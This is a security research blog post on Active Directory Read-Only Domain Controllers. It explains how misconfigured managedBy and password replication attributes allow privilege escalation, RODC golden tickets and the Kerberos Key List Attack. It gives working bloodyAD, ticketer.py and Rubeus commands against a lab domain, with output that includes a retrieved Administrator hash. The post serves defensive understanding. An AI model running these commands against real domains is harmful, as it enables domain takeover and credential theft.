---
title: "Read-Only Domain Controllers: A Gold Mine"
date: 2026-07-01 00:00:00 +0000
categories: [Analysis, Research, ActiveDirectory]
tags: [active-directory, rodc, kerberos, golden-ticket, keylist-attack]
description: "How Read-Only Domain Controllers can be abused for privilege escalation and domain compromise."
---

## Introduction

Imagine your company has a branch office with inadequate physical security, but it still needs to communicate with your directory services infrastructure. What would you deploy in this scenario? The obvious choice is a Read-Only Domain Controller (RODC).

A RODC is ideal for remote locations where users need fast, reliable authentication, but the site lacks the physical security required to safely host a writable domain controller. Because it stores a read-only copy of Active Directory Domain Services database, it significantly reduces the risk of unauthorized changes or compromise if the server is physically accessed.

## The "managedBy" Attribute

Accounts referenced in the RODC's `managedBy` attribute are granted **local administrator** rights on that server. In other words, if you control a principal that has write access to this attribute, you can grant yourself (or any account you control) admin rights on the RODC.

Suppose the user `lowpriv` has write access to the `managedBy` attribute of `RODC00`:

```bash
bloodyAD -d contoso.local --host dc01.contoso.local -u lowpriv -p 'P@ssw0rd' \
  set object 'CN=RODC00,OU=Domain Controllers,DC=contoso,DC=local' 'managedBy' \
  -v "CN=LOWPRIV,CN=USERS,DC=CONTOSO,DC=LOCAL"
```

After this, `lowpriv` will no longer be a normal user, but will literally have the power to manage the Read-Only Domain Controller.

## Password Replication Policy

A RODC can only authenticate users locally if it has a cached copy of their credentials. Which accounts are permitted to have their credentials stored on the RODC is controlled by the **`msDS-RevealOnDemandGroup`** attribute, which specifies the principals whose credentials may be cached when needed.

The **`msDS-NeverRevealGroup`** attribute serves the opposite purpose by defining accounts whose credentials must never be stored on the RODC. This setting always overrides the allow list. As a result, if an account is included in both attributes, either directly or through nested group membership, the RODC will not cache or retrieve its credentials.

Those attributes are part of the **`The Password Replication Policy (PRP)`** which essentially indicates how the RODC is configured.


## msDS-RevealedUsers

The attribute **`msDS-RevealedUsers`** tells you which principals have had their credentials cached on the Read-Only Domain Controller.
It does not contain password hashes or credentials themselves. Instead, it maintains a history of accounts whose password material has been replicated from a writable Domain Controller because the RODC was allowed to cache their credentials and they successfully authenticated.

```bash
bloodyAD -d contoso.local --host dc01.contoso.local -u user -p 'P@ssw0rd' \ 
  get object 'CN=RODC00,OU=Domain Controllers,DC=contoso,DC=local' \ 
  --attr 'msDS-RevealedUsers'
```

Since it contains full binary metadata for each revelation entry, we can strip that out and extract just the relevant DNs:

```text
CN=Administrator,CN=Users,DC=contoso,DC=local
CN=krbtgt_29330,CN=Users,DC=contoso,DC=local
CN=RODC00,OU=Domain Controllers,DC=contoso,DC=local
```


## The RODC's Dedicated KRBTGT Account

When an RODC issues a Kerberos Ticket-Granting Ticket (TGT), it does not use the domain's primary KRBTGT account. Instead of using the domain's shared KRBTGT key, the RODC generates TGTs with the key belonging to its own dedicated KRBTGT account.

The name of this dedicated KRBTGT account is stored in the **`msDS-KrbTgtLink`** attribute of the RODC's computer object:

```bash
bloodyAD -d contoso.local --host dc01.contoso.local -u user -p 'P@ssw0rd' \
  get object 'CN=RODC00,OU=Domain Controllers,DC=contoso,DC=local' \ 
  --attr 'msDS-KrbTgtLink'
```

```text
distinguishedName: CN=RODC00,OU=Domain Controllers,DC=contoso,DC=local
msDS-KrbTgtLink: CN=krbtgt_29330,CN=Users,DC=contoso,DC=local
```

Every Ticket-Granting Ticket (TGT) issued by a RODC contains a **`Key Version Number (KVNO)`**, which identifies the version of the KRBTGT key used to encrypt and sign the ticket. In Kerberos, the KVNO is a standard mechanism for tracking key versions as they change over time. In the case of an RODC, however, it also serves another purpose, because each RODC has its own dedicated KRBTGT account, the KVNO can be used to identify that the ticket was issued by a specific RODC rather than by a writable domain controller.

### Ticket Upgrade Path

When a client presents an RODC-issued **Ticket-Granting Ticket (TGT)** to a writable Domain Controller, the ticket is validated against the RODC's PRP. The writable DC will accept the TGT only if the associated principal is permitted to have its credentials cached, specified in the RODC's **`msDS-RevealOnDemandGroup`** attribute and excluded from the **`msDS-NeverRevealGroup`** attribute.


## RODC Golden Ticket

As discussed earlier, each RODC has its own dedicated KRBTGT account. Consequently, obtaining the symmetric key for that account allows an attacker to forge a **`RODC Golden Ticket`**.

By default, these forged tickets are valid only within the context of the compromised RODC and are not trusted by writable Domain Controllers, but if the forged ticket targets an account whose credentials are eligible to be cached on the RODC, meaning it is permitted by the `Password Replication Policy` and not explicitly denied, a writable Domain Controller may accept and “upgrade” the ticket using the domain-wide KRBTGT key.

```bash
ticketer.py -aesKey 5c3a5b0e18f4cb2cf740346eb01b8d1ecfd9bc6d5ccfca9b451524ae5313dea2 \
  -domain-sid "S-1-5-21-1004336348-1177238915-682003330" \
  -domain "contoso.local" \
  -rodcNo 29330 \
  -user-id 500 Administrator
```

**Output:**

```text
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for contoso.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving/Updating ticket in Administrator.ccache
```

## The Key List Attack

The **Key List Attack** combines the RODC golden ticket with the ticket-upgrade mechanism to directly retrieve a target user's credential material from a writable DC. We basically forge a **RODC Golden Ticket** for the target user, send a **TGS-REQ** containing a **Key List Request** (KERB-KEY-LIST-REQ [161]) to a writable Domain Controller for the KRBTGT service. When the Key Distribution Center (KDC) receives it, and the target principal is in `msDS-RevealOnDemandGroup` and not in `msDS-NeverRevealGroup`, it will reply back including the long-term secrets of the client for the requested encryption types in the KERB-KEY-LIST-REP [162]

```bash
Rubeus.exe golden /rodcNumber:29330 \
  /aes256:5c3a5b0e18f4cb2cf740346eb01b8d1ecfd9bc6d5ccfca9b451524ae5313dea2 \
  /user:Administrator /id:500 /domain:contoso.local \
  /sid:S-1-5-21-1004336348-1177238915-682003330 \
  /nowrap /outfile:ticket.kirbi

Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/contoso.local \
  /dc:dc01.contoso.local /ticket:ticket.kirbi
```

**Output:**

```text
ServiceName              :  krbtgt/CONTOSO.LOCAL
ServiceRealm             :  CONTOSO.LOCAL
UserName                 :  Administrator (NT_PRINCIPAL)
UserRealm                :  CONTOSO.LOCAL
StartTime                :  6/30/2026 7:58:39 PM
EndTime                  :  7/1/2026 5:57:48 AM
RenewTill                :  1/1/0001 12:00:00 AM
Flags                    :  name_canonicalize, pre_authent
KeyType                  :  aes256_cts_hmac_sha1
Base64(key)              :  ICWvhdKFvKs+uHRcMJ9mIU+05VZu4XQOk3/CuRYsb+o=
Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

## Takeaways

| Attribute | Purpose |
|---|---|
| `managedBy` | Defines who can manage the RODC |
| `msDS-RevealedUsers` | Which principal's credentials were cached? |
| `msDS-RevealOnDemandGroup` | Allow-list of principals whose credentials the RODC may cache |
| `msDS-NeverRevealGroup` | Deny-list of principals whose credentials should not be cached |
| `msDS-KrbTgtLink` | Points to the RODC's dedicated KRBTGT account |

RODCs are built on the principle that compromising a branch office domain controller should not lead to the compromise of the entire domain. However, this security model depends on proper configuration. Misconfigured setups can undermine these protections, allowing what is intended to be a "read-only" domain controller to become an effective pivot point for escalating privileges and ultimately compromising the domain.

## References

> - [Key List Request](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff)
> - [The Kerberos Key List Attack: The return of the Read Only Domain Controllers](https://web.archive.org/web/20220121023726/https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
> - [At the Edge of Tier Zero: The Curious Case of the RODC](https://specterops.io/blog/2023/01/25/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc/)
